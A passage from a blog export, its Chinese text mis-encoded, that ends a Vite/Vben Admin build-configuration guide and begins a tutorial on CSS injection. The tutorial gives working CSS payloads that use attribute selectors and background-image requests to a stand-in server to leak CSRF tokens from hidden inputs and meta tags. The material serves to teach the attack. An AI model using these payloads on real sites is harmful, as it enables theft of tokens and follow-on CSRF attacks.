ä¹‹å¾Œè¦ä¿®æ”¹ä¸»é¡Œï¼Œç›´æ¥èª¿ç”¨ä¸€ä¸‹é€™å€‹æ–¹æ³•å³å¯ã€‚\nsrc/logics/theme/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { getThemeColors, ThemeMode, generateColors } from \u0026#39;../../../build/config/themeConfig\u0026#39;; import { replaceStyleVariables } from \u0026#39;vite-plugin-theme/es/client\u0026#39;; import { mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme/es/colorUtils\u0026#39;; export async function changeTheme(color: string, theme?: ThemeMode) { const colors = generateColors({ mixDarken, mixLighten, tinycolor, color, }); return await replaceStyleVariables({ colorVariables: [...getThemeColors(color, theme), ...colors], }); } Viteæ’ä»¶-vite-plugin-imagemin èªªæ˜ vite-plugin-imageminçš„npmé¦–é ï¼šä¸€å€‹å£“ç¸®åœ–ç‰‡è³‡æºçš„ vite æ’ä»¶ã€‚\né…ç½®é¡åƒ(ç”¨æ–¼å®‰è£imageminçš„ä¾è³´ï¼Œå› ç‚ºä¸­åœ‹å¯èƒ½æ²’æœ‰å®‰è£imageminã€‚) è‹¥éä¸­åœ‹ç”¨æˆ¶ï¼Œå¯è·³éé…ç½®é¡åƒ\npackage.json 1 2 3 4 \u0026#34;resolutions\u0026#34;: { \u0026#34;//\u0026#34;: \u0026#34;ç”¨æ–¼å®‰è£imageminçš„ä¾è³´é—œä¿‚ï¼Œå› ç‚ºä¸­åœ‹å¯èƒ½æ²’æœ‰å®‰è£imageminã€‚\u0026#34;, \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; }, å®‰è£ 1 yarn add vite-plugin-imagemin --dev é…ç½®æ’ä»¶ build/vite/plugin/imagemin.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // Image resource files used to compress the output of the production environment // https://github.com/anncwb/vite-plugin-imagemin import viteImagemin from \u0026#39;vite-plugin-imagemin\u0026#39;; export function configImageminPlugin() { const plugin = viteImagemin({ gifsicle: { optimizationLevel: 7, interlaced: false, }, optipng: { optimizationLevel: 7, }, webp: { quality: 75, }, mozjpeg: { quality: 8, }, pngquant: { quality: [0.8, 0.9], speed: 4, }, svgo: { plugins: [ { removeViewBox: false, }, { removeEmptyAttrs: false, }, ], }, }); return plugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 // ... import { configImageminPlugin } from \u0026#39;./imagemin\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... if (isBuild) { //vite-plugin-imagemin VITE_USE_IMAGEMIN \u0026amp;\u0026amp; vitePlugins.push(configImageminPlugin()); } return vitePlugins; } Viteæ’ä»¶-vite-plugin-compression èªªæ˜ vite-plugin-compressionçš„npmé¦–é ï¼švite-plugin-compressçš„å¢å¼·ç‰ˆï¼Œå£“ç¸®ç”¨çš„ã€‚\nå®‰è£ 1 yarn add vite-plugin-compression --dev é…ç½®æ’ä»¶ build/vite/plugin/compress.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /** * Used to package and output gzip. Note that this does not work properly in Vite, the specific reason is still being investigated * https://github.com/anncwb/vite-plugin-compression */ import type { Plugin } from \u0026#39;vite\u0026#39;; import compressPlugin from \u0026#39;vite-plugin-compression\u0026#39;; export function configCompressPlugin(compress: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39;): Plugin | Plugin[] { const compressList = compress.split(\u0026#39;,\u0026#39;); const plugins: Plugin[] = []; if (compressList.includes(\u0026#39;gzip\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.gz\u0026#39;, }) ); } if (compressList.includes(\u0026#39;brotli\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.br\u0026#39;, algorithm: \u0026#39;brotliCompress\u0026#39;, }) ); } return plugins; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configCompressPlugin } from \u0026#39;./compress\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // rollup-plugin-gzip vitePlugins.push(configCompressPlugin(VITE_BUILD_COMPRESS)); } return vitePlugins; } Viteæ’ä»¶-vite-plugin-pwa èªªæ˜ vite-plugin-pwaçš„npmé¦–é ï¼šPWAä¸€äº›æŠ€è¡“é›†æˆã€‚ Service Worker-åƒè€ƒéˆæ¥ PWA-MDNèªªæ˜ Bç«™-PWAé»‘é¦¬å…¬é–‹èª²æ•™å­¸ å®‰è£ 1 yarn add vite-plugin-pwa --dev é…ç½®æ’ä»¶ build/vite/plugin/pwa.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /** * Zero-config PWA for Vite * https://github.com/antfu/vite-plugin-pwa */ import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import { VitePWA } from \u0026#39;vite-plugin-pwa\u0026#39;; export function configPwaConfig(env: ViteEnv) { const { VITE_USE_PWA, VITE_GLOB_APP_TITLE, VITE_GLOB_APP_SHORT_NAME } = env; if (VITE_USE_PWA) { // vite-plugin-pwa const pwaPlugin = VitePWA({ manifest: { name: VITE_GLOB_APP_TITLE, short_name: VITE_GLOB_APP_SHORT_NAME, icons: [ { // ./è¡¨ç¤ºpublicæ–‡ä»¶å¤¾ src: \u0026#39;./resource/img/pwa-192x192.png\u0026#39;, sizes: \u0026#39;192x192\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, { src: \u0026#39;./resource/img/pwa-512x512.png\u0026#39;, sizes: \u0026#39;512x512\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, ], }, }); return pwaPlugin; } return []; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configPwaConfig } from \u0026#39;./pwa\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // vite-plugin-pwa vitePlugins.push(configPwaConfig(viteEnv)); } return vitePlugins; } Viteé…ç½®-optimizeDeps.include èªªæ˜ Viteé…ç½®-optimizedeps-includeèªªæ˜\nåŸæ–‡ï¼š\né¡å‹ï¼š string[]\né»˜èªæƒ…æ³ä¸‹ï¼Œä¸åœ¨ node_modules ä¸­çš„ï¼Œéˆæ¥çš„åŒ…ä¸æœƒè¢«é æ§‹å»ºã€‚ä½¿ç”¨æ­¤é¸é …å¯å¼·åˆ¶é æ§‹å»ºéˆæ¥çš„åŒ…ã€‚\nå®‰è£moment antdä¸­éœ€è¦ä½¿ç”¨momentã€‚è€Œmomenté…ç½®å’Œæœ¬ç« æœ‰é—œï¼Œæ‰€ä»¥å°±é †ä¾¿å®‰è£ä¸€ä¸‹ï¼š\n1 yarn add moment é…ç½®Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], // ... }, }; }; Viteé…ç½®-optimizeDeps.exclude èªªæ˜ Viteé…ç½®-optimizedeps-excludeèªªæ˜\nåŸæ–‡ï¼š\né¡å‹ï¼š string[]\nåœ¨é æ§‹å»ºä¸­å¼·åˆ¶æ’é™¤çš„ä¾è³´é …ã€‚\né…ç½®Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // ... exclude: [\u0026#39;vue-demi\u0026#39;], }, }; }; http-server èªªæ˜ é …ç›®ç·¨è­¯ä¹‹å¾Œçš„éœæ…‹æ–‡ä»¶æ˜¯ä¸èƒ½ç›´æ¥æœ¬åœ°è¨ªå•çš„ã€‚å› ç‚ºæœ¬åœ°è¨ªå•ä½¿ç”¨çš„æ˜¯file:///å”è­°ã€‚è€Œfile:///ä¸æ”¯æŒè·¨åŸŸå’Œä¸€äº›å…¶ä»–ç‰¹æ€§ã€‚æ¯”å¦‚JavaScriptæ¨¡å¡Šã€PWAç­‰ç­‰ã€‚\né‚£éº¼æ­¤æ™‚å°±éœ€è¦æ›ä¸€ç¨®è¨ªå•æœ¬åœ°æ–‡ä»¶çš„æ–¹å¼äº†ï¼Œå°±æ˜¯è®“æœ¬åœ°æˆç‚ºä¸€å€‹æœå‹™å™¨ã€‚é€šéhttpä¾†è¨ªå•ã€‚\nhttp-serverå°±å¯ä»¥å¯¦ç¾ä»¥httpå½¢å¼è¨ªå•æœ¬åœ°æ–‡ä»¶çš„ç›®çš„ï¼Œä½†æ˜¯é€™å€‹ä¾è³´ä¸ä¿è­‰å®‰å…¨ï¼Œåªç”¨æ–¼æœ¬åœ°æ¸¬è©¦ã€‚\nhttp-serverçš„npmé¦–é ï¼šå‘½ä»¤è¡Œå•Ÿå‹•ä¸€å€‹æœ¬åœ°æœå‹™å™¨ã€‚ä¸å®‰å…¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨ä¾†æ¸¬è©¦ã€‚\nå®‰è£ 1 yarn add http-server --dev é…ç½®è…³æœ¬ package.json 1 2 3 4 5 6 7 8 9 10 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, // ... }, // ... } ","date":"2022-10-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52422113584_3af97c79da_o.png","permalink":"https://wayneblog.ga/2022-10-12/vben-admin-guide/","title":"Vben Admin æŒ‡å—èˆ‡ Vite é…ç½®"},{"content":" ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸Šï¼‰ åƒè€ƒæ–‡ç«  ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injection - Huli CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style â€“ How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point å‰è¨€ åœ¨è¬›åˆ°é‡å°ç¶²é å‰ç«¯çš„æ”»æ“Šæ™‚ï¼Œä½ æˆ‘çš„å¿ƒä¸­æµ®ç¾çš„å…«æˆæœƒæ˜¯ XSSï¼Œä½†å¦‚æœä½ æ²’è¾¦æ³•åœ¨ç¶²é ä¸ŠåŸ·è¡Œ JavaScriptï¼Œæœ‰æ²’æœ‰å…¶ä»–çš„æ”»æ“Šæ‰‹æ³•å‘¢ï¼Ÿä¾‹å¦‚èªªï¼Œå‡è¨­å¯ä»¥æ’å…¥ style æ¨™ç±¤ï¼Œä½ èƒ½å¤ åšäº›ä»€éº¼ï¼Ÿ\nåœ¨ 2018 å¹´çš„æ™‚å€™ï¼Œæˆ‘æœ‰å¯«éä¸€ç¯‡ CSS keyloggerï¼šæ”»æ“Šèˆ‡é˜²ç¦¦ï¼Œé‚£æ™‚å‰›å¥½åœ¨ Hacker News ä¸Šé¢çœ‹åˆ°ç›¸é—œçš„è¨è«–ï¼Œæ–¼æ˜¯å°±èŠ±äº†é»æ™‚é–“ç ”ç©¶äº†ä¸€ä¸‹ã€‚\nè€Œ 4 å¹´å¾Œçš„ç¾åœ¨ï¼Œæˆ‘å¾è³‡å®‰çš„è§’åº¦é‡æ–°èªè­˜äº†é€™å€‹æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤æ‰“ç®—å¯«ä¸€å…©ç¯‡æ–‡ç« ä¾†å¥½å¥½è¬›è§£ CSS injectionã€‚\né€™ç¯‡çš„æ–‡ç« å…§å®¹åŒ…å«ï¼š\nä»€éº¼æ˜¯ CSS injectionï¼Ÿ CSS å·è³‡æ–™çš„åŸç† å¦‚ä½•å· hidden input çš„è³‡æ–™ å¦‚ä½•å· meta çš„è³‡æ–™ æ‰¿ä¸Šï¼Œä¸¦ä»¥ HackMD ç‚ºä¾‹ ä»€éº¼æ˜¯ CSS injectionï¼Ÿ é¡§åæ€ç¾©ï¼ŒCSS injection ä»£è¡¨çš„æ˜¯ä½ åœ¨ä¸€å€‹é é¢ä¸Šå¯ä»¥æ’å…¥ä»»ä½•çš„ CSS èªæ³•ï¼Œæˆ–æ˜¯è¬›å¾—æ›´æ˜ç¢ºä¸€é»ï¼Œä½ å¯ä»¥ä½¿ç”¨ \u0026lt;style\u0026gt; é€™å€‹æ¨™ç±¤ã€‚ä½ å¯èƒ½æœƒå¥½å¥‡ï¼Œç‚ºä»€éº¼æœƒæœ‰é€™ç¨®ç‹€æ³ï¼Ÿ\næˆ‘è‡ªå·±èªç‚ºå¸¸è¦‹çš„ç‹€æ³æœ‰å…©å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯ç¶²ç«™æœ‰éæ¿¾æ‰è¨±å¤šæ¨™ç±¤ï¼Œä½†ä¸è¦ºå¾— \u0026lt;style\u0026gt; æœ‰å•é¡Œï¼Œæ‰€ä»¥æ²’æœ‰éæ¿¾æ‰ã€‚ä¾‹å¦‚èªªå¾ˆå¤šç¶²ç«™éƒ½æœƒç”¨ç¾æˆçš„ library ä¾†è™•ç† sanitizationï¼Œå…¶ä¸­æœ‰ä¸€å¥—å¾ˆæœ‰åçš„å«åš DOMPurifyã€‚\nåœ¨ DOMPurify(v2.4.0) ä¹‹ä¸­ï¼Œé è¨­å°±æœƒå¹«ä½ æŠŠå„ç¨®å±éšªçš„æ¨™ç±¤å…¨éƒ½éæ¿¾æ‰ï¼Œåªç•™ä¸‹ä¸€äº›å®‰å…¨çš„ï¼Œä¾‹å¦‚èªª \u0026lt;h1\u0026gt; æˆ–æ˜¯ \u0026lt;p\u0026gt; é€™ç¨®ï¼Œè€Œé‡é»æ˜¯ \u0026lt;style\u0026gt; ä¹Ÿåœ¨é è¨­çš„å®‰å…¨æ¨™ç±¤è£¡é¢ï¼Œæ‰€ä»¥å¦‚æœä½ æ²’æœ‰ç‰¹åˆ¥æŒ‡å®šåƒæ•¸ï¼Œåœ¨é è¨­çš„ç‹€æ³ä¸‹ï¼Œ\u0026lt;style\u0026gt; æ˜¯ä¸æœƒè¢«éæ¿¾æ‰çš„ï¼Œå› æ­¤æ”»æ“Šè€…å°±å¯ä»¥æ³¨å…¥ CSSã€‚\nç¬¬äºŒç¨®ç‹€æ³å‰‡æ˜¯é›–ç„¶å¯ä»¥æ’å…¥ HTMLï¼Œä½†æ˜¯ç”±æ–¼ CSPï¼ˆContent Security Policyï¼‰çš„ç·£æ•…ï¼Œæ²’æœ‰è¾¦æ³•åŸ·è¡Œ JavaScriptã€‚æ—¢ç„¶æ²’è¾¦æ³•åŸ·è¡Œ JavaScriptï¼Œå°±åªèƒ½é€€è€Œæ±‚å…¶æ¬¡ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰è¾¦æ³•åˆ©ç”¨ CSS åšå‡ºä¸€äº›æƒ¡æ„è¡Œç‚ºã€‚\né‚£åˆ°åº•æœ‰äº† CSS injection ä¹‹å¾Œå¯ä»¥å¹¹å˜›ï¼ŸCSS ä¸æ˜¯æ‹¿ä¾†è£é£¾ç¶²é ç”¨çš„è€Œå·²å—ï¼Ÿé›£é“å¹«ç¶²é çš„èƒŒæ™¯æ›é¡è‰²ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹æ”»æ“Šæ‰‹æ³•ï¼Ÿ\nåˆ©ç”¨ CSS å·è³‡æ–™ CSS ç¢ºå¯¦æ˜¯æ‹¿ä¾†è£é£¾ç¶²é ç”¨çš„ï¼Œä½†æ˜¯åªè¦çµåˆå…©å€‹ç‰¹æ€§ï¼Œå°±å¯ä»¥ä½¿ç”¨ CSS ä¾†å·è³‡æ–™ã€‚\nç¬¬ä¸€å€‹ç‰¹æ€§ï¼šå±¬æ€§é¸æ“‡å™¨ã€‚\nåœ¨ CSS ç•¶ä¸­ï¼Œæœ‰å¹¾å€‹é¸æ“‡å™¨å¯ä»¥é¸åˆ°ã€Œå±¬æ€§ç¬¦åˆæŸå€‹æ¢ä»¶çš„å…ƒç´ ã€ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œinput[value^=a]ï¼Œå°±å¯ä»¥é¸åˆ° value é–‹é ­æ˜¯ a çš„å…ƒç´ ã€‚\né¡ä¼¼çš„é¸æ“‡å™¨æœ‰ï¼š\ninput[value^=a] é–‹é ­æ˜¯ a çš„ï¼ˆprefixï¼‰ input[value$=a] çµå°¾æ˜¯ a çš„ï¼ˆsuffixï¼‰ input[value*=a] å…§å®¹æœ‰ a çš„ï¼ˆcontainsï¼‰ è€Œç¬¬äºŒå€‹ç‰¹æ€§æ˜¯ï¼šå¯ä»¥åˆ©ç”¨ CSS ç™¼å‡º requestï¼Œä¾‹å¦‚èªªè¼‰å…¥ä¸€å¼µä¼ºæœå™¨ä¸Šçš„èƒŒæ™¯åœ–ç‰‡ï¼Œæœ¬è³ªä¸Šå°±æ˜¯åœ¨ç™¼ä¸€å€‹ requestã€‚\nå‡è¨­ç¾åœ¨é é¢ä¸Šæœ‰ä¸€æ®µå…§å®¹æ˜¯ \u0026lt;input name=\u0026quot;secret\u0026quot; value=\u0026quot;abc123\u0026quot;\u0026gt;ï¼Œè€Œæˆ‘èƒ½å¤ æ’å…¥ä»»ä½•çš„ CSSï¼Œæˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://myserver.com?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://myserver.com?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://myserver.com?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://myserver.com?q=z) } æœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ï¼Ÿ\nå› ç‚ºç¬¬ä¸€æ¢è¦å‰‡æœ‰é †åˆ©æ‰¾åˆ°å°æ‡‰çš„å…ƒç´ ï¼Œæ‰€ä»¥ input çš„èƒŒæ™¯å°±æœƒæ˜¯ä¸€å¼µä¼ºæœå™¨ä¸Šçš„åœ–ç‰‡ï¼Œè€Œç€è¦½å™¨å°±æœƒç™¼ request åˆ° https://myserver.com?q=aã€‚\nå› æ­¤ï¼Œç•¶æˆ‘åœ¨ server æ”¶åˆ°é€™å€‹ request çš„æ™‚å€™ï¼Œæˆ‘å°±çŸ¥é“ã€Œinput çš„ value å±¬æ€§ï¼Œç¬¬ä¸€å€‹å­—å…ƒæ˜¯ aã€ï¼Œå°±é †åˆ©å·åˆ°äº†ç¬¬ä¸€å€‹å­—å…ƒã€‚\né€™å°±æ˜¯ CSS ä¹‹æ‰€ä»¥å¯ä»¥å·è³‡æ–™çš„åŸå› ï¼Œé€éå±¬æ€§é¸æ“‡å™¨åŠ ä¸Šè¼‰å…¥åœ–ç‰‡é€™å…©å€‹åŠŸèƒ½ï¼Œå°±èƒ½å¤ è®“ server çŸ¥é“é é¢ä¸ŠæŸå€‹å…ƒç´ çš„å±¬æ€§å€¼æ˜¯ä»€éº¼ã€‚\nå¥½ï¼Œç¾åœ¨ç¢ºèª CSS å¯ä»¥å·å±¬æ€§çš„å€¼äº†ï¼Œæ¥ä¸‹ä¾†æœ‰å…©å€‹å•é¡Œï¼š\næœ‰ä»€éº¼æ±è¥¿å¥½å·ï¼Ÿ ä½ å‰›åªç¤ºç¯„å·ç¬¬ä¸€å€‹ï¼Œè¦æ€éº¼å·ç¬¬äºŒå€‹å­—å…ƒï¼Ÿ æˆ‘å€‘å…ˆä¾†è¨è«–ç¬¬ä¸€å€‹å•é¡Œï¼Œæœ‰å“ªäº›æ±è¥¿å¯ä»¥å·ï¼Ÿé€šå¸¸éƒ½æ˜¯è¦å·ä¸€äº›æ•æ„Ÿè³‡æ–™å°å§ï¼Ÿ\næœ€å¸¸è¦‹çš„ç›®æ¨™ï¼Œå°±æ˜¯ CSRF tokenã€‚å¦‚æœä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ CSRFï¼Œå¯ä»¥å…ˆçœ‹çœ‹æˆ‘ä¹‹å‰å¯«éçš„é€™ä¸€ç¯‡ï¼šè®“æˆ‘å€‘ä¾†è«‡è«‡ CSRFï¼ˆè©±èªªæˆ‘æœ‰æ‰“ç®—å¯«æ–°çš„ CSRF ç³»åˆ—æ–‡ï¼Œæ‹–ç¨¿ä¸­ï¼Œæƒ³çœ‹çš„è©±å¯ç•™è¨€å‚¬ç¨¿ï¼‰ã€‚\nç°¡å–®ä¾†èªªå‘¢ï¼Œå¦‚æœ CSRF token è¢«å·èµ°ï¼Œå°±æœ‰å¯èƒ½æœƒè¢« CSRF æ”»æ“Šï¼Œç¸½ä¹‹ä½ å°±æƒ³æˆé€™å€‹ token å¾ˆé‡è¦å°±æ˜¯äº†ã€‚è€Œé€™å€‹ CSRF tokenï¼Œé€šå¸¸éƒ½æœƒè¢«æ”¾åœ¨ä¸€å€‹ hidden input ä¸­ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; æˆ‘å€‘è©²æ€éº¼å·åˆ°è£¡é¢çš„è³‡æ–™å‘¢ï¼Ÿ\nå· hidden input å°æ–¼ hidden input ä¾†èªªï¼Œç…§æˆ‘å€‘ä¹‹å‰é‚£æ¨£å¯«æ˜¯æ²’æœ‰æ•ˆæœçš„ï¼š\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a) } å› ç‚º input çš„ type æ˜¯ hiddenï¼Œæ‰€ä»¥é€™å€‹å…ƒç´ ä¸æœƒé¡¯ç¤ºåœ¨ç•«é¢ä¸Šï¼Œæ—¢ç„¶ä¸æœƒé¡¯ç¤ºï¼Œé‚£ç€è¦½å™¨å°±æ²’æœ‰å¿…è¦è¼‰å…¥èƒŒæ™¯åœ–ç‰‡ï¼Œå› æ­¤ server ä¸æœƒæ”¶åˆ°ä»»ä½• requestã€‚è€Œé€™å€‹é™åˆ¶éå¸¸åš´æ ¼ï¼Œå°±ç®—ç”¨ display:block !important; ä¹Ÿæ²’è¾¦æ³•è“‹éå»ã€‚\nè©²æ€éº¼è¾¦å‘¢ï¼Ÿæ²’é—œä¿‚ï¼Œæˆ‘å€‘é‚„æœ‰åˆ¥çš„é¸æ“‡å™¨ï¼Œåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] + input { background: url(https://example.com?q=a) } æœ€å¾Œé¢å¤šäº†ä¸€å€‹ + inputï¼Œé€™å€‹åŠ è™Ÿæ˜¯å¦å¤–ä¸€å€‹é¸æ“‡å™¨ï¼Œæ„æ€æ˜¯ã€Œé¸åˆ°å¾Œé¢çš„å…ƒç´ ã€ï¼Œæ‰€ä»¥æ•´å€‹é¸æ“‡å™¨åˆåœ¨ä¸€èµ·ï¼Œå°±æ˜¯ã€Œæˆ‘è¦é¸ name æ˜¯ csrf-tokenï¼Œvalue é–‹é ­æ˜¯ a çš„ inputï¼Œçš„å¾Œé¢é‚£å€‹ inputã€ï¼Œä¹Ÿå°±æ˜¯ \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;ã€‚\næ‰€ä»¥ï¼ŒçœŸæ­£è¼‰å…¥èƒŒæ™¯åœ–ç‰‡çš„å…¶å¯¦æ˜¯åˆ¥çš„å…ƒç´ ï¼Œè€Œåˆ¥çš„å…ƒç´ ä¸¦æ²’æœ‰ type=hiddenï¼Œæ‰€ä»¥åœ–ç‰‡æœƒè¢«æ­£å¸¸è¼‰å…¥ã€‚\né‚£å¦‚æœå¾Œé¢æ²’æœ‰å…¶ä»–å…ƒç´ æ€éº¼è¾¦ï¼Ÿåƒæ˜¯é€™æ¨£ï¼š\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; ä»¥é€™å€‹æ¡ˆä¾‹ä¾†èªªï¼Œåœ¨ä»¥å‰å°±çœŸçš„ç©å®Œäº†ï¼Œå› ç‚º CSS ä¸¦æ²’æœ‰å¯ä»¥é¸åˆ°ã€Œå‰é¢çš„å…ƒç´ ã€çš„é¸æ“‡å™¨ï¼Œæ‰€ä»¥çœŸçš„æŸæ‰‹ç„¡ç­–ã€‚\nä½†ç¾åœ¨ä¸ä¸€æ¨£äº†ï¼Œå› ç‚ºæˆ‘å€‘æœ‰äº† :hasï¼Œé€™å€‹é¸æ“‡å™¨å¯ä»¥é¸åˆ°ã€Œåº•ä¸‹ç¬¦åˆç‰¹æ®Šæ¢ä»¶çš„å…ƒç´ ã€ï¼Œåƒé€™æ¨£ï¼š\n1 2 3 form:has(input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;]){ background: url(https://example.com?q=a) } æ„æ€å°±æ˜¯æˆ‘è¦é¸åˆ°ã€Œåº•ä¸‹æœ‰ï¼ˆç¬¦åˆé‚£å€‹æ¢ä»¶çš„ inputï¼‰çš„ formã€ï¼Œæ‰€ä»¥æœ€å¾Œè¼‰å…¥èƒŒæ™¯çš„æœƒæ˜¯ formï¼Œä¸€æ¨£ä¹Ÿä¸æ˜¯é‚£å€‹ hidden inputã€‚é€™å€‹ has selector å¾ˆæ–°ï¼Œå¾ä¸Šå€‹æœˆåº•é‡‹å‡ºçš„ Chrome 105 é–‹å§‹æ‰æ­£å¼æ”¯æ´ï¼Œç›®å‰åªå‰©ä¸‹ Firefox çš„ç©©å®šç‰ˆé‚„æ²’æ”¯æ´äº†ï¼Œè©³æƒ…å¯çœ‹ï¼šcaniuse\næœ‰äº† has ä»¥å¾Œï¼ŒåŸºæœ¬ä¸Šå°±ç„¡æ•µäº†ï¼Œå› ç‚ºå¯ä»¥æŒ‡å®šæ”¹è®ŠèƒŒæ™¯çš„æ˜¯å“ªå€‹çˆ¶å…ƒç´ ï¼Œæ‰€ä»¥æƒ³æ€éº¼é¸å°±æ€éº¼é¸ï¼Œæ€æ¨£éƒ½é¸å¾—åˆ°ã€‚\nå· meta é™¤äº†æŠŠè³‡æ–™æ”¾åœ¨ hidden input ä»¥å¤–ï¼Œä¹Ÿæœ‰äº›ç¶²ç«™æœƒæŠŠè³‡æ–™æ”¾åœ¨ \u0026lt;meta\u0026gt; è£¡é¢ï¼Œä¾‹å¦‚èªª \u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;abc123\u0026quot;\u0026gt;ï¼Œmeta é€™å€‹å…ƒç´ ä¸€æ¨£æ˜¯çœ‹ä¸è¦‹çš„å…ƒç´ ï¼Œè¦æ€éº¼å·å‘¢ï¼Ÿ\né¦–å…ˆï¼Œå¦‚åŒä¸Šå€‹æ®µè½çš„çµå°¾è¬›çš„ä¸€æ¨£ï¼Œhas æ˜¯çµ•å°å·å¾—åˆ°çš„ï¼Œå¯ä»¥é€™æ¨£å·ï¼š\n1 2 3 html:has(meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;]) { background: url(https://example.com?q=a); } ä½†é™¤æ­¤ä¹‹å¤–ï¼Œé‚„æœ‰å…¶ä»–æ–¹å¼ä¹Ÿå·å¾—åˆ°ã€‚\nmeta é›–ç„¶ä¹Ÿçœ‹ä¸åˆ°ï¼Œä½†è·Ÿ hidden input ä¸åŒï¼Œæˆ‘å€‘å¯ä»¥è‡ªå·±ç”¨ CSS è®“é€™å€‹å…ƒç´ è®Šæˆå¯è¦‹ï¼š\n1 2 3 4 5 6 7 meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } å¯æ˜¯é€™æ¨£é‚„ä¸å¤ ï¼Œä½ æœƒç™¼ç¾ request é‚„æ˜¯æ²’æœ‰é€å‡ºï¼Œé€™æ˜¯å› ç‚º meta åœ¨ head åº•ä¸‹ï¼Œè€Œ head ä¹Ÿæœ‰é è¨­çš„ display:none å±¬æ€§ï¼Œå› æ­¤ä¹Ÿè¦å¹« head 